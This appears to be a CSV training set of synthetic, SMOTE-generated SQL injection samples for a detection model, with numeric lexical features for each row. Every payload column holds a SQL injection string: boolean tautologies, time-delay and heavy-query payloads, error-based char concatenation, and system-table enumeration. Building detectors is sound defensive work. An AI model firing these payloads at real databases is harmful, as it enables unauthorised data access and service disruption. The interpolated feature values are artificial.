id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000438,attack,boolean,"1"" where 7380  =  7380 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000075,0.0060502682685489055,137.04672950025193,34.971962299848855,4.311400558334316,69.0,16.0,37.03738360020153,15.009345900050384,0.5034838935171491,0.11674988835180267,0.2702473816036953,0.10951883652735292,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.009345900050383,0.0,-1.1102230246251565e-16,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000439,attack,boolean,"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'eqyr' like 'eqyr",nearest_attack_euclidean,R000259,0.2781434408796986,148.07420587727887,30.916852941280023,4.078661315208439,88.74385293775924,8.332588234879909,35.831470587199775,15.166294117439953,0.5988317903566259,0.056106039824570936,0.24223282091436407,0.10282934890443907,4.0,0.0,0.0,0.0,1.0,1.083147058719977,0.0,4.0,0.0,-1.1102230246251565e-16,2.332588234879908,2.083147058719977,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000440,attack,boolean,-7187' or 4159  =  7465,nearest_attack_euclidean,R000031,0.002012571047597046,23.000000000000014,12.995531746772112,3.380843020430841,2.0,12.0,6.0,3.0,0.08695652173913043,0.5217391304347826,0.2608695652173913,0.13043478260869565,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000441,attack,boolean,-7903 where 6699  =  6699 or 8571  =  8571--,nearest_attack_euclidean,R000263,1.5231040789266304,46.232640074073444,16.44652801481469,3.5238038513469108,7.0,20.0,13.786112059258762,5.446528014814689,0.1518420776815797,0.43383450766165627,0.2967519711124787,0.11757144354428531,0.0,0.0,3.0,0.0,0.0,2.0,0.0,0.4465280148146906,0.0,-1.1102230246251565e-16,0.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.4465280148146904,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000442,attack,boolean,"1%' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000232,0.19974862714088942,121.80611001793922,30.757637522424023,4.096249600152217,63.0,10.0,30.0,18.80611001793922,0.5172419469901243,0.08210189634763876,0.24630568904291633,0.1543504676193206,0.9515275044848048,0.0,1.9030550089696097,0.0,1.0,1.0,0.0,4.0,0.9515275044848047,5.0,4.0,3.903055008969609,0.9515275044848047,0.0,0.9515275044848046,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000443,attack,boolean,"1%'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000050,0.4008332436218687,135.12252123539665,31.292492921534446,3.9936406658005588,65.87747876460334,8.146246460767223,43.24504247079332,17.853753539232777,0.4879170379912484,0.06034555140164982,0.3196160814725702,0.13212132913453156,1.0,0.0,2.0,0.0,1.0,1.0,0.0,6.561260617698329,1.0,-1.1102230246251565e-16,2.146246460767223,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.8537535392327765,0.14624646076722353,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000444,attack,boolean,"1"" and 1668  =  8288",nearest_attack_euclidean,R000060,0.31616733025821747,20.287715457793055,10.0,2.9287726409154082,3.0,9.0,6.287715457793055,2.0,0.14820177838879334,0.44460533516638007,0.30839170085229767,0.0988011855925289,0.0,0.9280711355517344,0.0,0.0,0.0,1.0,0.0,0.07192886444826563,0.0,-1.1102230246251565e-16,0.0,1.0,0.0,0.9280711355517344,0.0,0.0,0.0,1.0,0.07192886444826552,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000445,attack,boolean,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kkim""  =  ""kkim",nearest_attack_euclidean,R000185,0.9598681797078521,374.4964792889282,31.715291631734804,3.3943862509583593,102.6423541841326,48.07293744760221,170.1388334730608,53.64235418413259,0.27409154893295856,0.12841180651778913,0.45425800632561,0.14323863822364233,0.0,3.9999999999999996,0.35764581586740163,0.0,0.0,3.0,0.0,35.2847083682652,0.0,-1.1102230246251565e-16,1.0,13.3576458158674,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,0.0,0.0,1.6423541841325986,0.3576458158674016,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,19.0
SMOTE_000446,attack,boolean,"1%""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000179,0.4429858040977008,141.9072582628552,30.817876377142532,3.878852161622876,71.81787637714254,8.0,44.27150550857013,17.817876377142532,0.5061831313871578,0.05639027787745181,0.3118778350210324,0.12554875571435806,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.817876377142532,1.0,-1.1102230246251565e-16,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.8178763771425327,0.18212362285746736,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000447,attack,boolean,-2223'   )    )    as mjwp where 8650  =  8650 or 7900  =  5838,nearest_attack_euclidean,R000284,0.9780958835912841,60.06402885781546,21.932374130114717,3.5520719385715824,13.266906467471323,19.199280597586036,22.398561195172075,5.1992805975860374,0.22313270216700004,0.31998598916105336,0.37166442695612617,0.08521688171582034,0.7330935325286788,0.0,0.7330935325286788,0.0,0.0,2.0,0.0,1.7330935325286783,0.0,-1.1102230246251565e-16,0.0,2.7330935325286787,0.7330935325286787,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.2669064674713213,0.7330935325286786,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000448,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000033,0.7987809341272111,109.17043096604226,31.464790385498482,3.6824936688323753,30.00845500229605,15.153520961450152,44.929580770996964,19.07887423129909,0.2645939630177676,0.14574015643603133,0.4124035565703984,0.1772623239758027,5.692958077099696,0.0,0.15352096145015193,0.8464790385498481,0.0,2.0,0.0,7.385916154199392,2.0,-1.1102230246251565e-16,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000449,attack,boolean,1'+  (  select bfeq where 3445  =  3445 and 9198  =  9198--,nearest_attack_euclidean,R000297,1.098003582273959,61.6957994459778,24.652100277011105,3.8071675490519836,14.854900646359248,18.79719963065186,20.145099353640752,7.89859981532593,0.24404556665126348,0.3038347294985234,0.3245716483137372,0.12754805553647597,1.0,0.0,2.0,0.0,0.0,2.0,0.0,1.8985998153259294,0.0,-1.1102230246251565e-16,0.4492999076629649,4.550700092337035,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.5507000923370352,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5507000923370353
SMOTE_000450,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000256,0.4068137630502321,383.8667367550306,31.0,3.30125102173091,93.50270838554303,56.67388902811473,181.35319482731552,52.336944514057365,0.2438046271183911,0.14754518768920583,0.4722699185223533,0.13638026667004974,0.0,0.0,1.0,0.0,0.0,2.834236128514341,0.0,37.50270838554302,0.0,-1.1102230246251565e-16,1.0,13.834236128514341,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,0.0,0.0,0.8342361285143407,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,18.83423612851434
SMOTE_000451,attack,boolean,"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000302,0.7683134593527917,138.1868335621145,37.74946684969158,3.893777111202191,43.74946684969158,23.0,53.56263328757711,17.87473342484579,0.31644141019760363,0.16649472403375926,0.38779876484961956,0.1292651009190176,2.437366712422895,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,-1.1102230246251565e-16,1.0,5.437366712422895,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.43736671242289504,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4373667124228953
SMOTE_000452,attack,boolean,1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--,nearest_attack_euclidean,R000187,1.0913516531719083,60.62419967012856,23.29300054978573,3.7220186473511068,15.834400439828592,17.0,20.789799230299977,7.0,0.2621634860272205,0.2805873716806491,0.34171316571774546,0.11553597657438493,1.0,0.0,2.0,0.0,0.0,2.0,0.0,1.541399890042853,0.0,-1.1102230246251565e-16,0.0,4.458600109957146,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.45860010995714656,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4586001099571466
SMOTE_000453,attack,boolean,select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,nearest_attack_euclidean,R000003,0.27971592863218264,71.26451044140696,22.836557875868213,3.3347847938108375,26.0,5.0,30.427952565538746,9.836557875868213,0.36532688018593895,0.07025516926652672,0.4265019314451442,0.13791601910239015,0.0,0.0,2.0,0.0,1.0,3.0,0.0,1.8365578758682117,0.0,-1.1102230246251565e-16,0.0,7.0,0.0,0.0,1.0,0.0,0.0,1.0,0.9182789379341063,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000454,attack,boolean,"1%'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000050,0.04557268941321417,131.65105850492392,31.0,3.9962516095833207,65.0,8.0,41.52084680393915,17.130211700984788,0.49380788039851503,0.06077635451058647,0.31530857277807295,0.13010719231282555,1.0,0.0,2.0,0.0,1.0,1.0,0.0,6.130211700984787,1.0,-1.1102230246251565e-16,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000455,attack,boolean,-1989%'   )    )    or 6179  =  8518#,nearest_attack_euclidean,R000267,0.41194768654414365,37.19029831086144,15.0,3.0148064354581194,2.0951491554307182,11.714552533707849,16.380596621722873,7.0,0.056230022265567337,0.3154226361863155,0.4400812903880549,0.18826605116006234,0.9048508445692831,0.09514915543071689,0.9048508445692831,0.0,0.0,1.0,0.0,2.0951491554307164,1.0,-1.1102230246251565e-16,0.0,1.904850844569283,0.9048508445692831,0.09514915543071689,0.0,1.0000000000000002,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.09514915543071689,0.9048508445692831,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000456,attack,boolean,"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",nearest_attack_euclidean,R000076,2.44736153672611,131.09767989411765,28.64968362192513,4.05055891006029,73.74947270320855,7.749472703208555,32.04883994705882,17.54989454064171,0.564947373454882,0.05791160690215327,0.24264093667399372,0.13450008296897095,1.9002109187165783,0.0,0.0,0.0,1.0,1.0,0.0,4.099789081283422,0.0,5.0,4.0,2.0,1.0,0.0,0.0,0.5498945406417108,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000457,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000063,0.06722483851464335,102.0,29.41395009083973,3.512800999461897,24.0,16.0,46.0,16.0,0.23529411764705882,0.1568627450980392,0.45098039215686275,0.1568627450980392,4.0,0.0,1.0,0.0,0.0,1.0,0.0,8.0,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000458,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""uidb"" like ""uidb",nearest_attack_euclidean,R000270,0.27837483257330603,132.53936413861075,29.0,4.225773809341507,84.0,3.9999999999999982,30.033740690237774,14.505623448372962,0.6342164507727257,0.030200783370129797,0.22616220458835976,0.10942056126878487,0.0,3.0,0.0,0.0,1.0,0.0,0.0,3.5056234483729636,0.0,-1.1102230246251565e-16,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000459,attack,boolean,-2717'   )    )     )   or 8571  =  8571--,nearest_attack_euclidean,R000150,0.8800237914357629,41.02008995990394,12.489955020048024,2.7043257100371303,2.2449775100240075,11.265067469927963,20.0,7.510044979951974,0.055293781642356266,0.2737417006379242,0.48847005062777005,0.18249446709194944,0.7550224899759872,0.0,2.755022489975987,0.0,0.0,1.0,0.0,3.0,0.0,-1.1102230246251565e-16,0.0,3.755022489975987,0.7550224899759872,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.2449775100240129,0.7550224899759871,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000460,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000025,0.61302549954782,138.0687597445376,30.413751948907517,3.860924573935131,45.04583982969173,16.0,51.60916796593835,25.413751948907517,0.3255787294829037,0.11611504244553633,0.3742720464078212,0.18403418166373875,3.4137519489075188,0.0,0.0,0.0,0.0,1.804583982969173,0.0,10.195416017030826,0.0,2.0,1.0,7.804583982969173,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,0.0,0.0,1.0,0.8045839829691728,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8045839829691732
SMOTE_000461,attack,boolean,"1%' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000232,0.7364650002758555,121.40437611868823,30.20583482491764,4.092538555414231,64.58833035016472,9.007293531147052,29.20583482491764,18.60291741245882,0.5323254309989487,0.07403540774301266,0.2404587797960673,0.15318038146197133,1.3970825875411796,0.0,1.6029174124588201,0.0,1.0,1.0,0.0,3.8014587062294103,0.8014587062294103,5.0,4.0,3.6029174124588206,1.0,0.0,0.8014587062294103,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000462,attack,boolean," select * from users where id  =  1 or ""1;""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000020,0.08869812790062782,65.0,21.11321334632844,3.4594251792478588,26.0,5.88678665367156,24.000000000000004,9.11321334632844,0.4,0.090565948518024,0.36923076923076925,0.14020328225120676,0.0,2.0,2.0,0.0,1.0,3.0,1.0,0.0,0.0,-1.1102230246251565e-16,0.11321334632843971,6.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000463,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R000181,0.07375689819881324,110.57582160620872,29.022325178620594,3.848424082494671,40.62047196344991,14.044650357241187,38.97767482137941,16.93302446413822,0.36694709186137703,0.12719297759174006,0.3527286391040907,0.1531312914427922,0.0,3.022325178620594,0.02232517862059369,0.0,0.0,1.0,0.0,7.955349642758813,0.9776748213794064,1.0,2.9553496427588133,1.0223251786205934,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.022325178620593578,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9776748213794064,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000464,attack,boolean,"1"" where 7380  =  7380 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000075,1.1974424412510105,144.49202613205549,34.62539869339723,4.256033681723033,71.24760783961665,16.0,41.49521567923328,15.749202613205547,0.4939314924411015,0.1112151927977643,0.28581708034631587,0.10903623441481836,0.374601306602774,0.625398693397226,2.0,0.0,1.0,2.0,0.0,4.749202613205548,0.0,-1.1102230246251565e-16,2.0,5.0,0.37460130660277385,0.6253986933972262,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000465,attack,boolean,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'rhzy'  =  'rhzy",nearest_attack_euclidean,R000032,1.7215309668836778,177.2016037228038,30.957478562254316,3.7791279679863976,97.93547163040509,10.08504287549137,50.74487137352589,18.43621784338147,0.5458081341209368,0.05634695693964342,0.2920883422138706,0.1057565667255492,4.0,0.0,0.0,0.0,1.0,2.0,0.0,5.914957124508629,0.0,-1.1102230246251565e-16,4.0850428754913715,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000466,attack,boolean,1  )   and 2006  =  2006,nearest_attack_euclidean,R000215,1.1393140234245822,25.06812502563062,11.424166700840832,2.8786553936391153,2.643958324789793,10.068125025630623,10.0,2.356041675210207,0.10686824802170242,0.3997251163340422,0.40018325577730524,0.0932233798669502,0.0,0.0,0.35604167521020735,0.0,0.0,1.0,0.0,1.0,0.0,-1.1102230246251565e-16,0.0,1.3560416752102071,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.6439583247897924,0.3560416752102076,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
